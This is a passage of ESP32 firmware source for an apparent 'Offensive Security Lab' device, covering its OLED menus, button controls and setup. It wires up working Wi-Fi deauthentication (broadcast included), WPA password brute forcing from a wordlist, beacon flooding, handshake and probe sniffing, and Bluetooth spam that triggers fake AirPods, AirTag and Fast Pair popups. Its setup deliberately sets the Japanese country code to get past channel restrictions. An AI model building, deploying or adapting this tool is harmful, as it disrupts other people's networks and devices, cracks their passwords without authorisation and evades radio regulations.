        int barY = 12 + 42 * g_bleScroll / total;
        oled.fillRect(125, barY, 3, barH, WHITE);
    }
    oledHint(">next  hold=back");
    oled.display();
}

// ── BLE spam running screen ─────────────────────────────────
static void drawBLESpam() {
    oled.clearDisplay();
    oledHeader("BLE Spam", g_bleSpamActive ? "RUN" : "STOP");
    oled.setTextColor(WHITE); oled.setTextSize(1);

    char buf[22];
    snprintf(buf, sizeof(buf), "Target: %s", SPAM_TARGET_NAMES[g_spamTarget]);
    oled.setCursor(0, 14); oled.print(buf);

    if (g_bleSpamActive) {
        oled.setCursor(0, 28); oled.print("MAC rotating");
        oled.setCursor(0, 40); oled.print("Payloads cycling");
        oled.setCursor(8, 48); oled.print(">> SPAMMING <<");
    } else {
        oled.setCursor(0, 28); oled.print("Real AirPods Pro,");
        oled.setCursor(0, 40); oled.print("AirTag, Fast Pair");
    }
    oledHint(g_bleSpamActive ? ">back  hold=stop" : ">back  hold=start");
    oled.display();
}

// ── Spam target selector ────────────────────────────────────
static void drawBLETarget() {
    oled.clearDisplay();
    oledHeader("Spam Target");
    oled.setTextColor(WHITE);
    oled.setTextSize(1);
    oled.setCursor(0, 16); oled.print("Pop popups on:");

    oled.setTextSize(2);
    const char* name = SPAM_TARGET_NAMES[g_spamTarget];
    int textW = strlen(name) * 12;
    oled.setCursor((128 - textW) / 2, 30);
    oled.print(name);

    oled.setTextSize(1);
    oledHint(">next  hold=save");
    oled.display();
}

// ── System info (shows the AP password too) ─────────────────
static void drawSysInfo() {
    oled.clearDisplay();
    oledHeader("System Info");
    oled.setTextColor(WHITE); oled.setTextSize(1);

    char buf[24];
    snprintf(buf,sizeof(buf),"AP: %.18s", g_apSSID.c_str());
    oled.setCursor(0, 14); oled.print(buf);
    snprintf(buf,sizeof(buf),"PW: %.18s", g_apPass.c_str());
    oled.setCursor(0, 24); oled.print(buf);
    snprintf(buf,sizeof(buf),"IP: 192.168.4.1");
    oled.setCursor(0, 34); oled.print(buf);
    snprintf(buf,sizeof(buf),"Heap:%dK STA:%d",
             (int)(ESP.getFreeHeap()/1024), (int)WiFi.softAPgetStationNum());
    oled.setCursor(0, 44); oled.print(buf);

    oledHint("any key = back");
    oled.display();
}

// ── Dispatcher ─────────────────────────────────────────────────
void refreshOLED() {
    switch (g_screen) {
        case SCR_MAIN:         drawMain();        break;
        case SCR_WIFI_MENU:    drawWifiMenu();    break;
        case SCR_BLE_MENU:     drawBLEMenu();     break;
        case SCR_WIFI_SCAN:    drawWifiScan();    break;
        case SCR_WIFI_LIST:    drawWifiList();    break;
        case SCR_DEAUTH:       drawDeauth();      break;
        case SCR_BEACON:       drawBeacon();      break;
        case SCR_BEACON_COUNT: drawBeaconCount(); break;
        case SCR_PROBE:        drawProbe();       break;
        case SCR_BRUTE:        drawBrute();       break;
        case SCR_BLE_SCAN:     drawBLEScan();     break;
        case SCR_BLE_LIST:     drawBLEList();     break;
        case SCR_BLE_SPAM:     drawBLESpam();     break;
        case SCR_BLE_TARGET:   drawBLETarget();   break;
        case SCR_SYSINFO:      drawSysInfo();     break;
        default:               drawMain();        break;
    }
}

// ─────────────────────────────────────────────────────────────
//  ████  BUTTON HANDLER  ████
// ─────────────────────────────────────────────────────────────

// Short press: navigate or cycle, depending on screen
static void handleShortPress() {
    switch (g_screen) {

    // ── Top-level main menu ──────────────────────────────────
    case SCR_MAIN:
        g_menuSel = (g_menuSel + 1) % MAIN_ITEMS_N;
        if (g_menuSel < g_menuScroll)      g_menuScroll = g_menuSel;
        if (g_menuSel >= g_menuScroll + 4) g_menuScroll = g_menuSel - 3;
        break;

    // ── WiFi sub-menu ────────────────────────────────────────
    case SCR_WIFI_MENU:
        g_wifiMenuSel = (g_wifiMenuSel + 1) % WIFI_MENU_N;
        if (g_wifiMenuSel < g_wifiMenuScroll)      g_wifiMenuScroll = g_wifiMenuSel;
        if (g_wifiMenuSel >= g_wifiMenuScroll + 4) g_wifiMenuScroll = g_wifiMenuSel - 3;
        break;

    // ── BLE sub-menu ─────────────────────────────────────────
    case SCR_BLE_MENU:
        g_bleMenuSel = (g_bleMenuSel + 1) % BLE_MENU_N;
        if (g_bleMenuSel < g_bleMenuScroll)      g_bleMenuScroll = g_bleMenuSel;
        if (g_bleMenuSel >= g_bleMenuScroll + 4) g_bleMenuScroll = g_bleMenuSel - 3;
        break;

    // ── AP selection list ────────────────────────────────────
    case SCR_WIFI_LIST: {
        int total = (g_apCount > 0) ? (g_apCount + 1) : 0;  // APs + BACK
        if (total > 0) {
            g_apSelected = (g_apSelected + 1) % total;
            if (g_apSelected < g_apScroll)      g_apScroll = g_apSelected;
            if (g_apSelected >= g_apScroll + 4) g_apScroll = g_apSelected - 3;
        } else {
            g_screen = SCR_WIFI_MENU;
        }
        break;
    }

    // ── BLE device list ──────────────────────────────────────
    case SCR_BLE_LIST: {
        int total = (int)g_bleResults.size();
        if (total > 0) {
            g_bleSelected = (g_bleSelected + 1) % total;
            if (g_bleSelected < g_bleScroll)      g_bleScroll = g_bleSelected;
            if (g_bleSelected >= g_bleScroll + 4) g_bleScroll = g_bleSelected - 3;
        } else {
            g_screen = SCR_BLE_MENU;
        }
        break;
    }

    // ── Cycler screens ───────────────────────────────────────
    case SCR_BEACON_COUNT:
        g_beaconCountIdx = (g_beaconCountIdx + 1) % BEACON_COUNTS_N;
        break;

    case SCR_BLE_TARGET:
        g_spamTarget = (SpamTarget)((g_spamTarget + 1) % 4);
        break;

    // ── WiFi tool screens → back to WiFi menu ────────────────
    case SCR_WIFI_SCAN:
    case SCR_DEAUTH:
    case SCR_BEACON:
    case SCR_PROBE:
    case SCR_BRUTE:
        g_screen = SCR_WIFI_MENU;
        break;

    // ── BLE tool screens → back to BLE menu ──────────────────
    case SCR_BLE_SCAN:
    case SCR_BLE_SPAM:
        g_screen = SCR_BLE_MENU;
        break;

    // ── System info / anything else → back to main ───────────
    default:
        g_screen = SCR_MAIN;
        break;
    }
    g_oledDirty = true;
}

// Long press: enter/start/toggle, depending on screen
static void handleLongPress() {
    switch (g_screen) {

    // ── Main menu ───────────────────────────────────────────
    case SCR_MAIN:
        switch (g_menuSel) {
            case 0:  // WiFi sub-menu
                g_wifiMenuSel = 0; g_wifiMenuScroll = 0;
                g_screen = SCR_WIFI_MENU;
                break;
            case 1:  // BLE sub-menu
                g_bleMenuSel = 0; g_bleMenuScroll = 0;
                g_screen = SCR_BLE_MENU;
                break;
            case 2: g_screen = SCR_SYSINFO; break;
        }
        break;

    // ── WiFi sub-menu ───────────────────────────────────────
    case SCR_WIFI_MENU:
        switch (g_wifiMenuSel) {
            case 0:  // WiFi Scan
                g_screen = SCR_WIFI_SCAN;
                if (!g_scanRunning) {
                    if (g_probeActive)   stopProbeSniffer();
                    if (g_eapolActive)   stopEapolSniffer();
                    if (g_deauth.active) stopDeauth();
                    if (g_beacon.active) stopBeaconFlood();
                    for (int i = 0; i < g_apCount; i++) g_aps[i].selected = false;
                    g_apCount = 0; g_apSelected = 0; g_apScroll = 0;
                    g_scanRunning = true;
                    g_scanJson = R"({"networks":[],"count":0,"status":"scanning"})";
                    logAdd("OLED: WiFi scan starting...");
                    xTaskCreatePinnedToCore(wifiScanTaskFn, "wifiscan", 12288,
                                            nullptr, 5, &g_wifiScanTask, 0);
                }
                break;
            case 1:  // WiFi Death — attack selected APs (or broadcast)
                g_screen = SCR_DEAUTH;
                if (!g_deauth.active) {
                    int n = startDeauthMulti();
                    if (n == 0) logAdd("Death: no targets — hold=broadcast");
                }
                break;
            case 2: {  // WiFi Brute — PSK brute against first selected AP
                g_screen = SCR_BRUTE;
                if (!g_brute.active) {
                    int picked = -1;
                    for (int i = 0; i < g_apCount; i++)
                        if (g_aps[i].selected) { picked = i; break; }
                    if (picked < 0) {
                        logAdd("Brute: no target selected (use Scan → mark with *)", "WARN");
                    } else {
                        startBruteForce(g_aps[picked].ssid, "/wordlist.txt", 4000);
                    }
                }
                break;
            }
            case 3: g_screen = SCR_BEACON;       break;
            case 4: g_screen = SCR_BEACON_COUNT; break;
            case 5: g_screen = SCR_PROBE;        break;
            case 6: g_screen = SCR_MAIN;         break;  // Back
        }
        break;

    // ── BLE sub-menu ────────────────────────────────────────
    case SCR_BLE_MENU:
        switch (g_bleMenuSel) {
            case 0:  // BLE Scan
                g_screen = SCR_BLE_SCAN;
                if (!g_bleScanActive && g_bleReady) {
                    xTaskCreatePinnedToCore([](void*) {
                        startBLEScan(5); vTaskDelete(nullptr);
                    }, "blescan_oled", 4096, nullptr, 3, nullptr, 0);
                }
                break;
            case 1: g_screen = SCR_BLE_SPAM;   break;
            case 2: g_screen = SCR_BLE_TARGET;  break;
            case 3: g_screen = SCR_MAIN;        break;  // Back
        }
        break;

    // ── AP selection list: toggle / back ────────────────────
    case SCR_WIFI_LIST:
        if (g_apCount == 0) { g_screen = SCR_WIFI_MENU; break; }
        if (g_apSelected == g_apCount) {
            g_screen = SCR_WIFI_MENU;  // << Back
        } else {
            g_aps[g_apSelected].selected = !g_aps[g_apSelected].selected;
        }
        break;

    // ── BLE device list: back to BLE menu ───────────────────
    case SCR_BLE_LIST:
        g_screen = SCR_BLE_MENU;
        break;

    // ── Deauth: toggle (targeted first, broadcast fallback) ─
    case SCR_DEAUTH:
        if (g_deauth.active) {
            stopDeauth();
        } else {
            int n = startDeauthMulti();
            if (n == 0) startDeauth("FF:FF:FF:FF:FF:FF", "FF:FF:FF:FF:FF:FF", 6, 0);
        }
        break;

    // ── Beacon flood: toggle ─────────────────────────────────
    case SCR_BEACON:
        if (g_beacon.active) stopBeaconFlood();
        else startBeaconFlood(6, 0, nullptr);  // 0 = infinite from OLED
        break;

    // ── Beacon count: save + back to WiFi menu ──────────────
    case SCR_BEACON_COUNT: {
        int cnt = BEACON_COUNTS[g_beaconCountIdx];
        logAdd("Beacon count = " + (cnt ? String(cnt) : String("INF")));
        g_screen = SCR_WIFI_MENU;
        break;
    }

    // ── Probe sniffer: toggle ────────────────────────────────
    case SCR_PROBE:
        if (g_probeActive) stopProbeSniffer();
        else startProbeSniffer();
        break;

    // ── WiFi Brute: long-press toggles start/stop ────────────
    case SCR_BRUTE:
        if (g_brute.active) {
            stopBruteForce();
        } else {
            // Re-pick first selected AP from the list and restart
            int picked = -1;
            for (int i = 0; i < g_apCount; i++)
                if (g_aps[i].selected) { picked = i; break; }
            if (picked < 0)
                logAdd("Brute: no target selected (use Scan → mark with *)", "WARN");
            else
                startBruteForce(g_aps[picked].ssid, "/wordlist.txt", 4000);
        }
        break;

    // ── BLE spam: toggle ─────────────────────────────────────
    case SCR_BLE_SPAM:
        if (g_bleSpamActive) stopBLESpam();
        else { applySpamTarget(); startBLESpam("multi"); }
        break;

    // ── Spam target: save + back to BLE menu ─────────────────
    case SCR_BLE_TARGET:
        applySpamTarget();
        logAdd("Spam target = " + String(SPAM_TARGET_NAMES[g_spamTarget]));
        g_screen = SCR_BLE_MENU;
        break;

    // ── Scanning splash: long press = abort / back ───────────
    case SCR_WIFI_SCAN:
        g_screen = SCR_WIFI_MENU;
        break;
    case SCR_BLE_SCAN:
        g_screen = SCR_BLE_MENU;
        break;

    // ── System info / anything else: back ────────────────────
    case SCR_SYSINFO:
    default:
        g_screen = SCR_MAIN;
        break;
    }
    g_oledDirty = true;
}

// Called every loop iteration — polls GPIO0 with debounce + long-press detection
void btnTick() {
    if (millis() < 2000) return;  // ignore GPIO0 during first 2s (esptool RTS/DTR reset artifact)
    unsigned long now  = millis();
    bool          down = (digitalRead(BTN_PIN) == LOW);

    if (down && !btnWasDown) {
        // Button just pressed
        btnDownAt    = now;
        btnWasDown   = true;
        btnLongFired = false;
    } else if (down && btnWasDown && !btnLongFired && (now - btnDownAt) >= LONG_PRESS_MS) {
        // Long press threshold reached — fire immediately (don't wait for release)
        btnLongFired = true;
        handleLongPress();
    } else if (!down && btnWasDown) {
        // Button released
        btnWasDown = false;
        if (!btnLongFired && (now - btnDownAt) >= DEBOUNCE_MS) {
            // Clean short press
            handleShortPress();
        }
    }
}

// ─────────────────────────────────────────────────────────────
//  API Routes  (web UI fully preserved from v2.0)
// ─────────────────────────────────────────────────────────────
static bool authOk(AsyncWebServerRequest* req) {
    if (!req->hasHeader("Cookie")) return false;
    String token = parseCookie(req->header("Cookie"), "session");
    return safeEquals(token, g_sessionToken);
}
static void sendUnauth(AsyncWebServerRequest* req) {
    req->send(401,"application/json","{\"error\":\"Unauthorized — open the dashboard first\"}");
}

static void serveHtml(AsyncWebServerRequest* req, const char* fsPath) {
    AsyncWebServerResponse* resp = req->beginResponse(LittleFS, fsPath, "text/html");
    if (!resp){ req->send(404); return; }
    resp->addHeader("Set-Cookie",
        "session="+g_sessionToken+"; HttpOnly; SameSite=Strict; Path=/; Max-Age=86400");
    resp->addHeader("Cache-Control","no-cache, must-revalidate");
    req->send(resp);
}

void setupRoutes() {
    // REAPER web surface = landing page only.
    // All operational control is on the OLED + BOOT button.
    // No attack endpoints exposed over HTTP.
    server.serveStatic("/style.css",LittleFS,"/style.css").setCacheControl("max-age=604800, public");
    server.serveStatic("/",         LittleFS,"/"        ).setDefaultFile("index.html");

    server.onNotFound([](AsyncWebServerRequest* req){
        req->send(404,"application/json","{\"error\":\"Not Found\"}");
    });
}

// ─────────────────────────────────────────────────────────────
//  Setup
// ─────────────────────────────────────────────────────────────
void setup() {
    Serial.begin(115200);
    delay(300);

    Serial.println(F("\n╔═════════════════════════════════════════╗"));
    Serial.println(F("║   ESP32 Offensive Security Lab  v3.0    ║"));
    Serial.println(F("║   OLED: auto-detect I2C                 ║"));
    Serial.println(F("║   BTN : GPIO0 (BOOT)                    ║"));
    Serial.println(F("╚═════════════════════════════════════════╝"));

    // ── OLED auto-detect ─────────────────────────────────────
    // Tries common SDA/SCL pin pairs for ESP32 OLED boards.
    // First pair that responds at 0x3C (or 0x3D) is used.
    struct PinPair { uint8_t sda, scl; const char* name; };
    static const PinPair I2C_TRIES[] = {
        {21, 22, "standard"},
        { 5,  4, "ideaspark"},
        { 4,  5, "ideaspark-alt"},
        { 4, 15, "heltec"},
        {22, 21, "reversed"},
    };

    int  oledSDA  = -1, oledSCL = -1;
    uint8_t oledAddrFound = 0;

    for (auto& p : I2C_TRIES) {
        Wire.end();
        delay(40);
        Wire.begin(p.sda, p.scl);
        delay(60);
        Serial.printf("[I2C] try SDA=%-2d SCL=%-2d (%-13s):", p.sda, p.scl, p.name);
        int found = 0;
        for (uint8_t a = 1; a < 127; a++) {
            Wire.beginTransmission(a);
            if (Wire.endTransmission() == 0) {
                Serial.printf(" 0x%02X", a);
                found++;
                if ((a == 0x3C || a == 0x3D) && oledSDA < 0) {
                    oledSDA = p.sda; oledSCL = p.scl; oledAddrFound = a;
                }
            }
        }
        Serial.println(found ? "" : " none");
    }

    bool oledOK = false;
    if (oledSDA >= 0) {
        Serial.printf("[OLED] using SDA=%d SCL=%d addr=0x%02X\n",
                      oledSDA, oledSCL, oledAddrFound);
        Wire.end();
        delay(40);
        Wire.begin(oledSDA, oledSCL);
        oledOK = oled.begin(SSD1306_SWITCHCAPVCC, oledAddrFound);
    }

    if (!oledOK) {
        Serial.println(F("[WARN] OLED not detected on any pin pair"));
        Serial.println(F("       Web UI still works at http://192.168.4.1"));
    } else {
        oled.clearDisplay();
        oled.setTextColor(WHITE);
        oled.setTextSize(1);
        oled.setCursor(14, 2);
        oled.print("SecurityLab v3.0");
        oled.setCursor(0, 18);
        oled.print("AP: "); oled.print(g_apSSID);
        oled.setCursor(0, 30);
        oled.print("PW: "); oled.print(g_apPass);
        oled.setCursor(0, 42);
        oled.print("IP: 192.168.4.1");
        oled.setCursor(0, 54);
        oled.print("Starting...");
        oled.display();
        Serial.println(F("[OLED] SSD1306 OK"));
    }

    // ── Button pin ───────────────────────────────────────────
    pinMode(BTN_PIN, INPUT_PULLUP);

    // ── Session token ────────────────────────────────────────
    g_sessionToken = generateSessionToken();
    Serial.printf("[AUTH] Session token (%u chars)\n", g_sessionToken.length());

    // ── Preferences ──────────────────────────────────────────
    prefs.begin("seclab", false);
    g_apSSID = prefs.getString("ssid", DEFAULT_AP_SSID);
    g_apPass = prefs.getString("pass", DEFAULT_AP_PASS);

    // ── LittleFS ─────────────────────────────────────────────
    if (!LittleFS.begin(true))
        Serial.println(F("[ERR] LittleFS — run: pio run -t uploadfs"));

    // ── WiFi AP ──────────────────────────────────────────────
    WiFi.mode(WIFI_AP_STA);           // APSTA: AP for dashboard, STA for raw injection
    WiFi.softAPConfig(AP_IP, AP_GW, AP_SN);
    WiFi.softAP(g_apSSID.c_str(), g_apPass.c_str(), AP_CHANNEL, 0, 8);
    delay(100);

    // ── CRITICAL: Country = "JP" to unlock channels 12-14 ──────
    // Why "JP" and not "01":
    //   - "01" = "Worldwide Indoor" → ESP-IDF SILENTLY restricts TX to ch 1-11
    //     even when nchan=13. esp_wifi_set_channel(12) returns OK but radio
    //     never transmits on 12 — frames vanish at the PHY regulatory layer.
    //   - "JP" = Japan → only country code that legally allows ch 1-14 FULL TX.
    //   - WIFI_COUNTRY_POLICY_MANUAL = ignore any AP-advertised country code.
    // Empirically confirmed: with "01" deauth works on ch 1-11 but fails on
    // ch 12-13. With "JP" deauth works on ALL channels 1-14.
    wifi_country_t country = {
        .cc            = "JP",
        .schan         = 1,
        .nchan         = 14,
        .max_tx_power  = 84,           // 21 dBm cap (regulatory hard limit)
        .policy        = WIFI_COUNTRY_POLICY_MANUAL,
    };
    esp_err_t cr = esp_wifi_set_country(&country);
    Serial.printf("[WIFI] Country=JP ch=1-14 result=0x%x\n", cr);

    esp_wifi_set_max_tx_power(68);    // 17 dBm — balanced default (attack raises to 78)

    // CRITICAL: enable WiFi modem-sleep before bringing BLE up.
    // Without this, WiFi + BT coexistence corrupts the heap.
    esp_wifi_set_ps(WIFI_PS_MIN_MODEM);

    // ── BLE ──────────────────────────────────────────────────
    BLEDevice::init("ESP32-SecurityLab");
    g_bleScan = BLEDevice::getScan();
    g_bleScan->setAdvertisedDeviceCallbacks(&g_bleScanCBInstance);
    g_bleScan->setActiveScan(true);
    g_bleScan->setInterval(100);
    g_bleScan->setWindow(99);

    // ── Web server ───────────────────────────────────────────
    DefaultHeaders::Instance().addHeader("Access-Control-Allow-Origin",  "*");
    DefaultHeaders::Instance().addHeader("Access-Control-Allow-Headers", "Content-Type");
    DefaultHeaders::Instance().addHeader("Access-Control-Allow-Methods", "GET, POST, OPTIONS");
    setupRoutes();
    server.begin();

    Serial.printf("[AP]  SSID: %s\n",     g_apSSID.c_str());
    Serial.printf("[AP]  PASS: %s\n",     g_apPass.c_str());
    Serial.printf("[WEB] http://%s\n",    WiFi.softAPIP().toString().c_str());

    logAdd("Security Lab v3.0 started");
    logAdd("AP: " + g_apSSID + " | IP: " + WiFi.softAPIP().toString());

    // ── Show main menu on OLED ───────────────────────────────
    delay(1500);   // let startup splash stay briefly
    g_oledDirty = true;
}

// ─────────────────────────────────────────────────────────────
//  Loop
// ─────────────────────────────────────────────────────────────
void loop() {
    // Poll button
    btnTick();

    // Refresh OLED immediately on state change, or every 750 ms for live counters
    static unsigned long lastOledRefresh = 0;
    if (g_oledDirty || (millis() - lastOledRefresh >= 750)) {
        lastOledRefresh = millis();
        g_oledDirty     = false;
        refreshOLED();
    }

    vTaskDelay(1);
}
